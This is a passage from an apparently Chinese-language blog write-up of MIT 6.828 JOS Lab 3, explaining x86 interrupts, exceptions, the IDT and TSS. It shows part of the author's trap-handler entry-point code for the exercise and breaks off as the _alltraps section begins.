class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali">Table 9-1. Interrupt<span class="hljs-built_in"> and </span>Exception ID Assignments<br><br>Identifier   Description<br><br>0            Divide error<br>1            Debug exceptions<br>2            Nonmaskable interrupt<br>3            Breakpoint (one-byte INT 3 instruction)<br>4            Overflow (INTO instruction)<br>5            Bounds<span class="hljs-built_in"> check </span>(BOUND instruction)<br>6            Invalid opcode<br>7            Coprocessor<span class="hljs-built_in"> not </span>available<br>8            Double fault<br>9            (reserved)<br>10           Invalid TSS<br>11           Segment<span class="hljs-built_in"> not </span>present<br>12           Stack exception<br>13           General protection<br>14           Page fault<br>15           (reserved)<br>16           Coprecessor error<br>17-31        (reserved)<br>32-255       Available for external interrupts via INTR pin<br></code></pre></td></tr></table></figure><h4 id="Enabling-and-Disabling-Interrupts">Enabling and Disabling Interrupts</h4><p>若多个中断同时发生，我们不应当在处理一个中断时跑去处理另一个中断，因此需要明确什么时候能进行中断处理</p><p>对于不可屏蔽中断而言，处理器在执行到 iret 指令之前都会忽略 NMI 引脚上的中断信号</p><p>对于可屏蔽中断而言，当 IF 标志位为 0 时中断被关闭，只有在 IF == 1时才能进行，与其他标志位一样，在处理器重置时 IF 会被清空，我们可以通过 <code>cli</code> 与 <code>sli</code> 指令清空或设置 IF 标志位，这两个指令只有在 CLI （特权级）&lt;= IOPL 时才可用，否则会触发保护异常</p><p>IF 标志位还会被这些操作影响：</p><ul><li><code>pushf</code> 指令将 eflags 寄存器的值推到栈上</li><li>在任务切换时会调用 <code>popf</code> 与 <code>iret</code> 指令载入标志位寄存器</li><li>在通过中断门时会自动重置 IF 标志位，关闭中断</li></ul><p>RF 标志位用以控制 debug fault，对于给定指令其最多会被触发一次</p><p>对 ss 寄存器的更改（mov 或 pop）也会影响一些中断与异常，例如我们改变堆栈（<code>ss:esp</code>）的过程中（刚好改了 ss 没改 esp）处理了中断或异常，则堆栈指针在中断/异常处理的过程中是不一致的，因此 80386 在更改 ss 的指令后的指令边界处禁止 NMI、INTR、debug fault 或单步陷阱，可能会有例外：page fault 或 general protection fault，因此我们需要使用 80386 的 <code>lss</code> 指令</p><h4 id="Priority-Among-Simultaneous-Interrupts-and-Exceptions">Priority Among Simultaneous Interrupts and Exceptions</h4><p>中断与异常的处理同样有着优先级，处理器会先处理高优先级的异常而丢弃低优先级的异常，当中断处理返回时会发现被丢弃的异常并重新处理；优先级顺序如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-2.</span> Priority Among Simultaneous Interrupts <span class="hljs-keyword">and</span> Exceptions<br><br>Priority   <span class="hljs-keyword">Class</span> <span class="hljs-keyword">of</span> Interrupt <span class="hljs-keyword">or</span> <span class="hljs-keyword">Exception</span><br><br>HIGHEST    Faults <span class="hljs-keyword">except</span> <span class="hljs-keyword">debug</span> faults<br>Trap instructions <span class="hljs-keyword">INTO</span>, <span class="hljs-type">INT</span> n, <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">Debug</span> traps <span class="hljs-keyword">for</span> this instruction<br><span class="hljs-keyword">Debug</span> faults <span class="hljs-keyword">for</span> next instruction<br>NMI interrupt<br>LOWEST     INTR interrupt<br></code></pre></td></tr></table></figure><h4 id="Interrupt-Descriptor-Table">Interrupt Descriptor Table</h4><p>类似于段描述符表，中断同样有着对应的<strong>门描述符</strong>（Gate Descriptor）结构与一张<strong>中断描述符表</strong>（Interrupt Descriptor Table），不同于 GDT 与 LDT，IDT 的第一个描述符是可用的，因为中断与异常一共有着 256 个标号，因此一张中断描述符表上最多可以有 256 个中断描述符（也可以少于这个数量）</p><p>中断描述符表的地址存放在 IDT 寄存器（IDTR）中，我们可以通过 <code>lidt</code> 指令（通过线性地址装载 IDT，只能在 0 特权级下执行）与 <code>sidt</code> 指令（拷贝当前 IDTR 的值，可以在任何特权级下执行）操作 IDTR</p><p>中断描述符表的结构如下：</p><p><img src="https://s2.loli.net/2022/03/17/vPQKmeGVhyJ3ADT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/17/5WujsrOYPpkMIze.png" alt="image.png"></p><h4 id="IDT-Descriptor">IDT Descriptor</h4><p>中断描述符表中包含如下三种描述符：</p><ul><li>任务门（用作任务切换，后面可能会讲到）</li><li>中断门</li><li>陷阱门</li></ul><p>描述符的结构如下所示</p><p><img src="https://s2.loli.net/2022/03/17/Q3GiDPscdyKmLIT.png" alt="image.png"></p><h4 id="Interrupt-Procedures">Interrupt Procedures</h4><p>如同 call 指令一般，中断与异常其实就是“call”中断处理程序——处理器通过中断或异常标号作为 IDT 的索引找到对应的中断描述符，若是一个中断门或陷阱门则其会以类似“call”调用门的方式调用处理程序，若是一个任务门，则会以类似“call”任务门的方式引起任务切换</p><p>中断门与陷阱门并不直接指向处理程序，而是通过下图的方式找到处理程序地址：门的选择子指向一个 GDT/LDT 中的可执行段，门的 offset 域指向中断/异常处理程序的开头</p><p><img src="https://s2.loli.net/2022/03/17/yoAXZpNmQDS3Vvr.png" alt="image.png"></p><p>如同 call 指令引起的控制流转移一般，中断与异常的处理过程同样使用堆栈存储返回原始过程所需的信息，并使用 iret 指令从栈上恢复这些信息，如同下图所示：</p><p><img src="https://s2.loli.net/2022/03/17/qWnwvs9NreXpuiD.png" alt="image.png"></p><p>在通过中断门或陷阱门后会将 eflags 存到栈上，并重置 TF （trap flag）标志位，以此防止单步执行的调试过程影响中断响应，完成后 iret 指令会从栈上恢复 eflags，需要注意的是通过中断门后会重置 IF ，但通过陷阱门并不会重置 IF</p><p>在中断过程中 CPU 不允许将控制权转移到低于当前特权级的段上，否则会触发 general protection fault，因此我们可以通过任一下列策略防止这种情况的发生：</p><ul><li>将处理程序放在合适的段中，这样的策略适合一些特殊的异常处理程序（例如 divided by zero），这样的处理程序必须仅使用堆栈中的可用数据，若其需要来自数据段的数据，则需要确保数据段的特权级为 3，从而使其不受访问保护</li><li>将处理程序放在特权级 0 的段中</li></ul><h4 id="Interrupt-Tasks">Interrupt Tasks</h4><p>IDT 中的任务门并不直接指向一个任务，如同下图所示，门的选择子指向 GDT 中的一个 TSS 描述符，当中断或异常触发通过任务门时，将会进行任务的切换</p><p><img src="https://s2.loli.net/2022/03/17/GZBLwKDji6f7gdC.png" alt="image.png"></p><p>使用一个独立的任务来处理中断有如下优点：</p><ul><li>会自动保存进程上下文</li><li>中断处理程序可以通过一个单独的地址空间与其他任务独立开来，比如通过一个 LDT 或 独立页表</li></ul><p>任务的切换参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c07.htm">Chapter 7</a>.，需要说明的是中断任务同样通过 iret 指令返回原进程；若是任务切换是由一个带着错误代码的异常引起的，则处理器会自动将错误代码存到处理程序的栈上</p><p>在 80386 中使用中断任务时，实际上有两个调度器：软件调度器（OS的一部分）与硬件调度器（处理器中断机制的一部分），软件调度器的设计应该考虑到硬件调度器可以在启用中断时调度中断任务这一事实</p><h4 id="Interrupt-Summary">Interrupt Summary</h4><p>下表总结了 386 所识别的异常：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-6.</span> <span class="hljs-keyword">Exception</span> <span class="hljs-keyword">Summary</span><br><br>Description               Interrupt   <span class="hljs-keyword">Return</span> Address  <span class="hljs-keyword">Exception</span>     <span class="hljs-keyword">Function</span> That Can Generate<br>Number      Points <span class="hljs-keyword">to</span>       <span class="hljs-keyword">Type</span>          the <span class="hljs-keyword">Exception</span><br>Faulting<br>Instruction<br><br>Divide error               <span class="hljs-number">0</span>          YES             FAULT         DIV, IDIV<br><span class="hljs-keyword">Debug</span> exceptions           <span class="hljs-number">1</span><br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>)<br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>) <span class="hljs-keyword">Any</span> instruction<br>Breakpoint                 <span class="hljs-number">3</span>          <span class="hljs-keyword">NO</span>              TRAP          One-byte <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br>Overflow                   <span class="hljs-number">4</span>          <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-keyword">INTO</span><br>Bounds <span class="hljs-keyword">check</span>               <span class="hljs-number">5</span>          YES             FAULT         BOUND<br>Invalid opcode             <span class="hljs-number">6</span>          YES             FAULT         <span class="hljs-keyword">Any</span> illegal instruction<br>Coprocessor <span class="hljs-keyword">not</span> available  <span class="hljs-number">7</span>          YES             FAULT         ESC, WAIT<br><span class="hljs-type">Double</span> fault               <span class="hljs-number">8</span>          YES             <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> instruction that can<br>generate an <span class="hljs-keyword">exception</span><br>Coprocessor Segment<br>Overrun                    <span class="hljs-number">9</span>          <span class="hljs-keyword">NO</span>              <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> operand <span class="hljs-keyword">of</span> an ESC<br>instruction that wraps around<br>the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> a segment.<br>Invalid TSS               <span class="hljs-number">10</span>          YES             FAULT<br>An invalid-TSS fault <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> restartable <span class="hljs-keyword">if</span> it occurs during the<br>processing <span class="hljs-keyword">of</span> an <span class="hljs-keyword">external</span> interrupt.        JMP, <span class="hljs-keyword">CALL</span>, IRET, <span class="hljs-keyword">any</span> interrupt<br>Segment <span class="hljs-keyword">not</span> present       <span class="hljs-number">11</span>          YES             FAULT         <span class="hljs-keyword">Any</span> segment-register modifier<br>Stack <span class="hljs-keyword">exception</span>           <span class="hljs-number">12</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference thru SS<br>General Protection        <span class="hljs-number">13</span>          YES             FAULT/<span class="hljs-keyword">ABORT</span><br><span class="hljs-keyword">All</span> GP faults are restartable. <span class="hljs-keyword">If</span> the fault occurs <span class="hljs-keyword">while</span> attempting <span class="hljs-keyword">to</span><br>vector <span class="hljs-keyword">to</span> the <span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> an <span class="hljs-keyword">external</span> interrupt, the interrupted program <span class="hljs-keyword">is</span><br>restartable, but the interrupt may be lost.  <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span class="hljs-keyword">fetch</span><br>Page fault                <span class="hljs-number">14</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span class="hljs-keyword">fetch</span><br>Coprocessor error         <span class="hljs-number">16</span>          YES             FAULT<br>Coprocessor errors are reported <span class="hljs-keyword">as</span> a fault <span class="hljs-keyword">on</span> the first ESC <span class="hljs-keyword">or</span> WAIT<br>instruction executed <span class="hljs-keyword">after</span> the ESC instruction that caused the error.        ESC, WAIT<br>Two-byte SW Interrupt     <span class="hljs-number">0</span><span class="hljs-number">-255</span>       <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-type">INT</span> n<br></code></pre></td></tr></table></figure><blockquote><p>详细说明参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm</a></p></blockquote><h4 id="Error-Code">Error Code</h4><p>若异常与一个特定的段相关联，则处理器会将一个错误代码存到异常处理程序的栈上，格式如下图所示</p><p><img src="https://s2.loli.net/2022/03/17/zTLnsmHUW2RVYue.png" alt="image.png"></p><p>在错误代码中并不包含特权级字段，取而代之的是两个新的位：</p><ul><li>EXT bit：程序外部的事件造成了异常</li><li>I-bit（IDT-bit）：错误代码的 index 字段引用 IDT 中的门描述符</li></ul><p>若未设置 I-bit，则 TI 位指示错误代码引用 GDT（0）还是 LDT（1），剩下的 14 位为段选择子的高 14 位</p><p>下表总结了异常中的错误代码信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Description                       Interrupt     <span class="hljs-built_in">Error</span> Code<br>Number<br><br>Divide <span class="hljs-built_in">error</span>                       0            <span class="hljs-literal">No</span><br><span class="hljs-built_in">Debug</span> exceptions                   1            <span class="hljs-literal">No</span><br>Breakpoint                         3            <span class="hljs-literal">No</span><br>Overflow                           4            <span class="hljs-literal">No</span><br>Bounds check                       5            <span class="hljs-literal">No</span><br>Invalid opcode                     6            <span class="hljs-literal">No</span><br>Coprocessor <span class="hljs-keyword">not</span> available          7            <span class="hljs-literal">No</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">System </span><span class="hljs-built_in">error</span>                       8            <span class="hljs-literal">Yes</span> (always 0)<br>Coprocessor Segment Overrun        9            <span class="hljs-literal">No</span><br>Invalid TSS                       10            <span class="hljs-literal">Yes</span><br>Segment <span class="hljs-keyword">not</span> present               11            <span class="hljs-literal">Yes</span><br>Stack exception                   12            <span class="hljs-literal">Yes</span><br>General protection fault          13            <span class="hljs-literal">Yes</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">Page </span>fault                        14            <span class="hljs-literal">Yes</span><br>Coprocessor <span class="hljs-built_in">error</span>                 16            <span class="hljs-literal">No</span><br>Two-byte SW interrupt             0-255         <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><h3 id="Basics-of-Protected-Control-Transfer">Basics of Protected Control Transfer</h3><p>异常与中断都是“被保护的控制流切换”——将处理器切换至内核态（CPL=0），且不会给用户态代码影响内核或其他环境的机会</p><p>在 Intel 术语中，一个中断通常是由处理器外部的异步事件触发的，例如外设的 I/O；而异常则是由当前运行的代码同步触发的事件，例如非法内存访问</p><p>为了确保中断与异常“真正受到保护”，其被设计为：触发其的代码只能在特定条件下进入内核的特定位置，通过以下两种机制：</p><ul><li><strong>中断描述符表</strong>：处理器确保中断与异常只能通过特定的入口点进入内核，这便是中断描述符表中的「门」结构，x86允许多达 256 个不同的入口点——对应 256 个中断描述符表索引，处理器从该表中对应条目加载：<ul><li>eip：异常处理程序代码地址</li><li>cs：代码段选择子，在其 0 ~ 1 位中包含运行异常处理程序的特权级（在 JOS 中所有异常都在 0 特权级下处理）</li></ul></li><li><strong>任务状态段</strong>：处理器需要一个地方来保存中断发生前的上下文，以便在完成处理后恢复上下文，但这个区域不应当被用户进程访问，中断处理需要陷入内核，于是也需要独立的内核堆栈，因此<strong>任务状态段</strong>（TSS）结构指定了内核堆栈的地址与段选择子，处理器将旧的 ss、esp、eflags、cs、eip、（可选）error code 压到内核栈上，从中断描述符中加载 cs 与 eip，并设置 <code>ss:esp</code> 以引用新的堆栈</li></ul><p>我们在 JOS 中 TSS 仅用来定义从用户态切换到内核态时应切换到的内核堆栈，不使用其他字段</p><h3 id="Types-of-Exceptions-and-Interrupts">Types of Exceptions and Interrupts</h3><p><s>说过了.jpg</s></p><p>本节我们将扩展 JOS 的 0 ~31 号异常向量，下一届我们将扩展软中断（0x30）作为 JOS 的系统调用入口点，在 lab4 中我们将扩展 JOS 以让其处理硬件中断（例如时钟中断）</p><h3 id="An-Example">An Example</h3><p><s>懒得看，反正就那回事</s></p><h3 id="Nested-Exceptions-and-Interrupts">Nested Exceptions and Interrupts</h3><p>对于内核中的嵌套中断而言不需要重复切换内核堆栈，只需要保存旧的上下文到内核堆栈上即可</p><h3 id="Setting-Up-the-IDT">Setting Up the IDT</h3><p>接下来我们将设置 IDT 的 0~31 号中断向量，随后我们会设置系统调用中断的处理程序，在后面的 lab 中设置 32 ~ 47 号中断（设备中断）</p><p>我们应当实现如下所示控制流程：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">      IDT                   trapentry.S         trap.c</span><br><span class="hljs-code">   </span><br><span class="hljs-code">+----------------+</span>                        <br>|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)<br>|                |             // do stuff      &#123;<br>|                |             call trap          // handle the exception/interrupt<br><span class="hljs-section">|                |             // ...           &#125;</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handler2    |--------&gt; handler2:<br>|                |            // do stuff<br>|                |            call trap<br><span class="hljs-section">|                |            // ...</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-code">       .</span><br><span class="hljs-code">       .</span><br><span class="hljs-section">       .</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handlerX    |--------&gt; handlerX:<br>|                |             // do stuff<br>|                |             call trap<br><span class="hljs-section">|                |             // ...</span><br><span class="hljs-section">+----------------+</span><br></code></pre></td></tr></table></figure><p>每一个异常或中断都应在 <code>trapentry.S</code> 中有其自己的 handler，而 <code>trap_init()</code> 应当初始化这些 handler，每个 handler 应当在栈上建立一个 <code>struct Trapframe</code>（参见 <code>inc/trap.h</code>）并将其指针作为参数调用 <code>trap()</code>，由其对应调用到相应的处理函数</p><p>补充了那么多的基础知识，接下来是 Exercise 4——编辑 <code>trapentry.S</code> 与 <code>trap.c</code> 实现中断与异常处理</p><blockquote><p><strong>Exercise 4.</strong> Edit <code>trapentry.S</code> and <code>trap.c</code> and implement the features described above. The macros <code>TRAPHANDLER</code> and <code>TRAPHANDLER_NOEC</code> in <code>trapentry.S</code> should help you, as well as the T_* defines in <code>inc/trap.h</code>. You will need to add an entry point in <code>trapentry.S</code> (using those macros) for each trap defined in <code>inc/trap.h</code>, and you’ll have to provide <code>_alltraps</code> which the <code>TRAPHANDLER</code> macros refer to. You will also need to modify <code>trap_init()</code> to initialize the <code>idt</code> to point to each of these entry points defined in <code>trapentry.S</code>; the <code>SETGATE</code> macro will be helpful here.</p><p>Your <code>_alltraps</code> should:</p><ol><li>push values to make the stack look like a struct Trapframe</li><li>load <code>GD_KD</code> into <code>%ds</code> and <code>%es</code></li><li><code>pushl %esp</code> to pass a pointer to the Trapframe as an argument to trap()</li><li><code>call trap</code> (can <code>trap</code> ever return?)</li></ol><p>Consider using the <code>pushal</code> instruction; it fits nicely with the layout of the <code>struct Trapframe</code>.</p><p>Test your trap handling code using some of the test programs in the <code>user</code> directory that cause exceptions before making any system calls, such as <code>user/divzero</code>. You should be able to get make grade to succeed on the <code>divzero</code>, <code>softint</code>, and <code>badsegment</code> tests at this point.</p></blockquote><p>我们需要在 <code>trapentry.S</code> 中建立中断入口点，这里 JOS 预先为我们提供了两个宏用来声明这些入口点，他们最终都会跳转到 <code>_alltraps</code> 标号处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">* TRAPHANDLER defines a globally-visible function <span class="hljs-keyword">for</span> handling a trap.<br> * It pushes a trap number onto the <span class="hljs-built_in">stack</span>, then jumps to _alltraps.<br> * Use TRAPHANDLER <span class="hljs-keyword">for</span> traps where the CPU automatically pushes an error code.<br> *<br> * You shouldn<span class="hljs-number">&#x27;</span>t call a TRAPHANDLER function from C, but you may<br> * need to _declare_ one in <span class="hljs-title function_">C</span> <span class="hljs-params">(<span class="hljs-keyword">for</span> instance, to get a function pointer</span><br><span class="hljs-params"> * during IDT setup)</span>.  You can declare the function with<br> *   <span class="hljs-type">void</span> <span class="hljs-title function_">NAME</span><span class="hljs-params">()</span>;<br> * where NAME is the argument passed to TRAPHANDLER.<br> */<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER(name, num)\</span><br><span class="hljs-meta">.globl name;<span class="hljs-comment">/* define global symbol for &#x27;name&#x27; */</span>\</span><br><span class="hljs-meta">.type name, @function;<span class="hljs-comment">/* symbol type is function */</span>\</span><br><span class="hljs-meta">.align 2;<span class="hljs-comment">/* align function definition */</span>\</span><br><span class="hljs-meta">name:<span class="hljs-comment">/* function starts here */</span>\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br><br><span class="hljs-comment">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn&#x27;t push an error code.</span><br><span class="hljs-comment"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="hljs-comment"> * format in either case.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER_NOEC(name, num)\</span><br><span class="hljs-meta">.globl name;\</span><br><span class="hljs-meta">.type name, @function;\</span><br><span class="hljs-meta">.align 2;\</span><br><span class="hljs-meta">name:\</span><br><span class="hljs-meta">pushl $0;\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br></code></pre></td></tr></table></figure><p>我们先参照 <code>inc/trap.h</code> 中提供的 <code>T_*</code> 宏声明对应入口点，对于会有 error code 的中断使用 <code>TRAPHANDLER</code> 宏，否则使用</p><p><code>TRAPHANDLER_NOEC</code> 宏，是否有 error code 参见上面的表格；宏里的 <code>name</code> 字段好像是可以随意声明的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for generating entry points for the different traps.</span><br><span class="hljs-comment"> */</span><br>TRAPHANDLER_NOEC(int0, T_DIVIDE)<br>TRAPHANDLER_NOEC(int1, T_DEBUG)<br>TRAPHANDLER_NOEC(int2, T_NMI)<br>TRAPHANDLER_NOEC(int3, T_BRKPT)<br>TRAPHANDLER_NOEC(int4, T_OFLOW)<br>TRAPHANDLER_NOEC(int5, T_BOUND)<br>TRAPHANDLER_NOEC(int6, T_ILLOP)<br>TRAPHANDLER_NOEC(int7, T_DEVICE)<br>TRAPHANDLER(int8, T_DBLFLT)<br><br>TRAPHANDLER(int10, T_TSS)<br>TRAPHANDLER(int11, T_SEGNP)<br>TRAPHANDLER(int12, T_STACK)<br>TRAPHANDLER(int13, T_GPFLT)<br>TRAPHANDLER(int14, T_PGFLT)<br><br>TRAPHANDLER_NOEC(int16, T_FPERR)<br>TRAPHANDLER_NOEC(__syscall, T_SYSCALL)<br></code></pre></td></tr></table></figure><p>之后就是实现 <code>_alltraps</code>，按注释我们应当向栈上压入对应数据形成一个 <code>Trapframe</code> 结构体，实际上只需要推入 es、ds、<code>PushRegs</code> 结构体，剩余的都会在我们运行到 <code>_alltraps</code> 前被压入栈上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> &#123;</span><br><span class="hljs-comment">/* registers as pushed by pusha */</span><br><span class="hljs-type">uint32_t</span> reg_edi;<br><span class="hljs-type">uint32_t</span> reg_esi;<br><span class="hljs-type">uint32_t</span> reg_ebp;<br><span class="hljs-type">uint32_t</span> reg_oesp;<span class="hljs-comment">/* Useless */</span><br><span class="hljs-type">uint32_t</span> reg_ebx;<br><span class="hljs-type">uint32_t</span> reg_edx;<br><span class="hljs-type">uint32_t</span> reg_ecx;<br><span class="hljs-type">uint32_t</span> reg_eax;<br>&#125; __attribute__((packed));<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> <span class="hljs-title">tf_regs</span>;</span><br><span class="hljs-type">uint16_t</span> tf_es;<br><span class="hljs-type">uint16_t</span> tf_padding1;<br><span class="hljs-type">uint16_t</span> tf_ds;<br><span class="hljs-type">uint16_t</span> tf_padding2;<br><span class="hljs-type">uint32_t</span> tf_trapno;<br><span class="hljs-comment">/* below here defined by x86 hardware */</span><br><span class="hljs-type">uint32_t</span> tf_err;<br><span class="hljs-type">uintptr_t</span> tf_eip;<br><span class="hljs-type">uint16_t</span> tf_cs;<br><span class="hljs-type">uint16_t</span> tf_padding3;<br><span class="hljs-type">uint32_t</span> tf_eflags;<br><span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br><span class="hljs-type">uintptr_t</span> tf_esp;<br><span class="hljs-type">uint16_t</span> tf_ss;<br><span class="hljs-type">uint16_t</span> tf_padding4;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure><p>这里的 padding 其实不需要我们手动压入栈上，我们在使用 <code>pushl</code> 指令压入 ds 与 es 时他们会自动扩展为 4 字节；之后我们还需要将 ds 与 es 的值设为 <code>GD_KD</code>，最后压入 esp 后手动调用 <code>trap()</code> 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for _alltraps</span><br><span class="hljs-comment"> 